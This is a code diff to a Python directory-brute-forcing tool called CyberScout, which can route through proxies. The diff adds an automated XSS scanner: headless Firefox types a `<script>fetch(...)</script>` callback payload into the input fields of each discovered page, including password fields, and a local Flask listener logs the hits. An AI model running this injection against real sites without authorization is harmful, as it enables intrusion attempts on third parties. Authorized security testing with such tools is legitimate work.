@@ -11,7 +11,12 @@ import sys
 from concurrent.futures import ThreadPoolExecutor
 import time
 import socket
-
+from flask import Flask, request
+import json
+from selenium import webdriver
+from selenium.webdriver.common.keys import Keys
+from selenium.webdriver.common.by import By
+from selenium.webdriver.firefox.service import Service
 
 #functions
 def get_proxy_with_api():
@@ -48,7 +53,7 @@ def forbidden_calc(forbidden_status, forbidden_freq):
 	if forbidden_status == False:
 		forbidden_freq = forbidden_freq - 1
 	elif forbidden_status == True:
-		forbidden_freq = forbidden_freq +1
+		forbidden_freq = forbidden_freq + 1
 
 	if forbidden_freq < 0:
 		forbidden_freq = 0
@@ -129,7 +134,7 @@ def advice_calc(timeout_freq, forbidden_freq, found_freq, error_freq, proxy_opti
 	#	print("No value for frequenties")
 
 
-def check_path(url, path, method, timeout, auth, proxies, output_file, proxy_option, start_time):
+def check_path(url, path, method, timeout, auth, proxies, output_file, proxy_option, start_time, info_option):
 
 	path = path.strip()
 	full_url = f"{url}/{path}"
@@ -152,14 +157,8 @@ def check_path(url, path, method, timeout, auth, proxies, output_file, proxy_opt
 				error_status = False
 				shared_data["found_list"].append(full_url)
 				if output_file:
-					with open(output_file, 'r+') as file:
-						content = file.readlines()
-						for i, line in enumerate(content):
-							if line.strip() == "========================================================":
-								content.insert(i, f"{GREEN}[FOUND]{RESET} {full_url}\n")
-								break
-						file.seek(0)
-						file.writelines(content)
+					with open(output_file, 'a') as file:
+						file.write(full_url + '\n')
 
 			elif response.status_code == 404:
 				#result = f"[NOT FOUND] {full_url}"
@@ -211,7 +210,11 @@ def check_path(url, path, method, timeout, auth, proxies, output_file, proxy_opt
 		seconds = int(elapsed % 60)
 
 		if status_output != "[NOT FOUND]":
-			print(f"[{status_output}] [{current_count}/{total_count}] [{minutes:02d}:{seconds:02d}] {full_url}")
+			if info_option:
+				print(f"[{current_count}/{total_count}] [{minutes:02d}:{seconds:02d}] {status_output} {full_url}")
+			else:
+				if status_output == f"{GREEN}[FOUND]{RESET}":
+					print(f"[{current_count}/{total_count}] [{minutes:02d}:{seconds:02d}] {status_output} {full_url}")
 
 		if output_file:
 			with open(output_file, 'a') as file:
@@ -229,6 +232,87 @@ def check_path(url, path, method, timeout, auth, proxies, output_file, proxy_opt
 		return shared_data["found_list"]
 
 
+
+
+#XSS-SCAN
+def xss_scan(url_dict):
+	url_map = {i + 1: url for i, url in enumerate(url_dict)}
+
+	print(f"\n{BOLD}Starting XSS scan ({len(url_map)} URLs found){RESET}")
+	# Flask App
+	app = Flask(__name__)
+
+	@app.route('/test', methods=['GET'])
+	def test_endpoint():
+		index = request.args.get('index', '')
+
+		if index and index.isdigit():
+			index = int(index)
+			url = url_map.get(index, "Unknown")
+			print(f"{GREEN}[GOT]{RESET} Received XSS payload from {url}")
+		return "Received"
+
+	def run_server():
+		app.run(host='0.0.0.0', port=8080, ssl_context='adhoc')
+
+	def load_urls(file_path):
+		with open(file_path, 'r') as f:
+			urls = [line.strip() for line in f if line.strip()]
+		return {i + 1: url for i, url in enumerate(urls)}
+
+	def is_url_reachable(url, timeout=3):
+		try:
+			response = requests.head(url, allow_redirects=True, timeout=timeout)
+			return True
+		except requests.RequestException:
+			return False
+
+	def scan_urls(url_dict):
+		geckodriver_path = "/usr/local/bin/geckodriver"
+		firefox_binary_path = "/usr/bin/firefox"
+
+		options = webdriver.FirefoxOptions()
+		options.headless = True
+		options.add_argument("--headless")
+		options.binary_location = firefox_binary_path
+
+
+		for index, url in url_dict.items():
+			time.sleep(3)
+			service = Service(geckodriver_path)
+			driver = webdriver.Firefox(service=service, options=options)
+			if is_url_reachable(url):
+				print(f"\n{PURPLE}[+]{RESET} Scanning {url}")
+
+				try:
+					driver.get(url)
+					xss_payload = f'''<script>fetch('https://192.168.0.26:8080/test?index={index}');</script>'''
+					inputs = driver.find_elements(By.TAG_NAME, "input")
+					print(f"[+] Found {len(inputs)} input(s)")
+					for input_element in inputs:
+						try:
+							input_type = input_element.get_attribute("type") or "text"
+							if input_type in ["text", "search", "email", "password", "url", "tel", "number"]:
+								driver.execute_script("arguments[0].scrollIntoView(true);", input_element)
+								input_element.clear()
+								input_element.send_keys(xss_payload)
+								input_element.send_keys(Keys.RETURN)
+								print(f"[+] Injected into input")
+						except Exception as e:
+							print(f"{error} Error injecting into input")
+				except Exception as e:
+					print(f"{error} Error loading URL")
+				finally:
+					driver.quit()
+			else:
+				print(f"{error} {url} Is unreachable")
+
+	server_thread = threading.Thread(target=run_server)
+	server_thread.daemon = True
+	server_thread.start()
+	time.sleep(3)
+	scan_urls(url_map)
+
 #arguments
 parser = argparse.ArgumentParser(description="Directory hunting tool for discovering URLs.")
 parser.add_argument("-u", "--url", type=str, required=True, help="Target URL (e.g. https://example.com)")
@@ -239,6 +323,7 @@ parser.add_argument("-a", "--auth", type=str, help="Basic authentication in the 
 parser.add_argument("-x", "--proxy", nargs='?', const="built_in", help="Proxy to use in the format 'ip:port'. If omitted, a built-in proxy will be used.")
 parser.add_argument("-m", "--method", type=str, default="GET", help="Method to use (GET, POST, PUT, DELETE, HEAD, OPTIONS, PATCH)")
 parser.add_argument("-n", "--threads", type=int, default=10, help="Number of threads to use (default is 10)")
+parser.add_argument("-i", "--info", action="store_true", help="See more info about the requests")
 args = parser.parse_args()
 
 #colors
@@ -251,7 +336,9 @@ BLUE_BACK = "\033[44m"
 ORANGE = "\033[33m"
 CYAN = "\033[96m"
 PURPLE = "\033[35m"
+BOLD = "\033[1m"
 RESET = "\033[0m"
+error = f"{RED}[!]{RESET}"
 
 
 #basic variables
@@ -259,6 +346,7 @@ start_time = time.time()
 url = args.url
 path_file = args.wordlist
 thread_amount = args.threads
+info_option = args.info
 if not os.path.exists(path_file):
 	print(f"{RED}[ERROR]{RESET}Wordlist not found")
 	sys.exit()
@@ -326,7 +414,7 @@ if proxy_option:
 #list
 if output_file is not None:
         with open(output_file, 'w') as file:
-                file.write("========================================================\n")
+                file.write("")
 
 
 with open(path_file, 'r') as file:
@@ -341,18 +429,15 @@ stop_event = threading.Event()
 def alert_worker():
 	while not stop_event.is_set():
 		if access_event.is_set():
-			print(f"{ORANGE}[WARNING]{RESET} Url not accessible")
+			print(f"{BOLD}[WARNING]{RESET} Url not accessible")
 		time.sleep(5)
 
 def ping_url():
-	print(f"{CYAN}[INFO]{RESET} Starting connectivity monitor...")
-
 	try:
 		response = requests.get(url, timeout=timeout)
-		if response.ok:
-			print(f"{CYAN}[INFO]{RESET} Url is accessible")
-		else:
+		if not response.ok:
 			print(f"{CYAN}[INFO]{RESET} Url returned status:", response.status_code)
+
 	except requests.exceptions.RequestException:
 		access_event.set()
 		print(f"{ORANGE}[WARNING]{RESET} Url not accessible")
@@ -365,17 +450,17 @@ def ping_url():
 			response = requests.get(url, timeout=timeout)
 			if response.ok:
 				if access_event.is_set():
-					print(f"{CYAN}[INFO]{RESET} Url is accessible again.")
+					print(f"{BOLD}[INFO]{RESET} Url is accessible again.")
 					access_event.clear()
 
 		except requests.exceptions.RequestException:
 			if not access_event.is_set():
 				access_event.set()
-		time.sleep(1)
+		time.sleep(4)
 
 ping_thread = threading.Thread(target=ping_url, daemon=True)
 ping_thread.start()
-
+time.sleep(2)
 
 
 
@@ -394,7 +479,8 @@ print(f"Threads:     {thread_amount}")
 print("========================================================")
 print(f"{current_time}: CyberScout launched by {user}")
 print("========================================================")
-print(f"{CYAN}[INFO]{RESET} Terminate the program by pressing Ctrl+C twice")
+print(f"{BOLD}[INFO]Terminate the program by pressing Ctrl+C twice{RESET}\n")
+
 
 
 
@@ -408,22 +494,24 @@ def output_clean():
 		file.writelines(lines)
 
 def prog_end():
-	print(f"{CYAN}[INFO]{RESET}Program terminating...")
 	stop_event.set()
-	print(f"{PURPLE}========================================================{RESET}")
-	if access_event.is_set():
-                print(f"{ORANGE}[WARNING]{RESET} Url has been unreachable")
-	print("Found URLs:\n")
-	for found in shared_data["found_list"]:
-		print(found)
-	print(f"{PURPLE}========================================================{RESET}")
-	print(f"{CYAN}[INFO]{RESET}It may take some time to terminate program (max duration: {thread_amount * timeout}s)")
-	print(f"{CYAN}[INFO]{RESET}It may take a few seconds to end the threads")
+
+	print(f"{BOLD}[INFO]Terminating program...{RESET}")
 	if output_file:
 		print(f"{RED}[WARNING]{RESET} Interrupting the program at this stage may result in issues with the creation of the output file.")
 		output_clean()
 
 	sys.exit(0)
+
+
+def path_end():
+        print(f"{PURPLE}========================================================{RESET}")
+        if access_event.is_set():
+                print(f"{ORANGE}[WARNING]{RESET} Url has been unreachable")
+        print("Found URLs:\n")
+        for found in shared_data["found_list"]:
+                print(found)
+        print(f"{PURPLE}========================================================{RESET}")
 
 
 
@@ -432,11 +520,10 @@ try:
 	with ThreadPoolExecutor(max_workers=thread_amount) as executor:
 		futures = []
 		for path in paths_list:
-			futures.append(executor.submit(check_path, url, path, method, timeout, auth, proxies, output_file, proxy_option, start_time))
+			futures.append(executor.submit(check_path, url, path, method, timeout, auth, proxies, output_file, proxy_option, start_time, info_option))
 		for future in futures:
 			future.result()
-	print(f"{CYAN}[INFO]{RESET}All paths tried")
-	prog_end()
+	print(f"{BOLD}[INFO] All paths tried{RESET}")
 
 except KeyboardInterrupt:
 	print("Keyboard interrumpt\n")
@@ -444,3 +531,13 @@ except KeyboardInterrupt:
 	executor.shutdown(wait=False, cancel_futures=True)
 
 	prog_end()
+
+path_end()
+try:
+	xss_scan(shared_data["found_list"])
+except KeyboardInterrupt:
+	print("Keyboard interrumpt\n")
+	prog_end()
+
+
+prog_end()
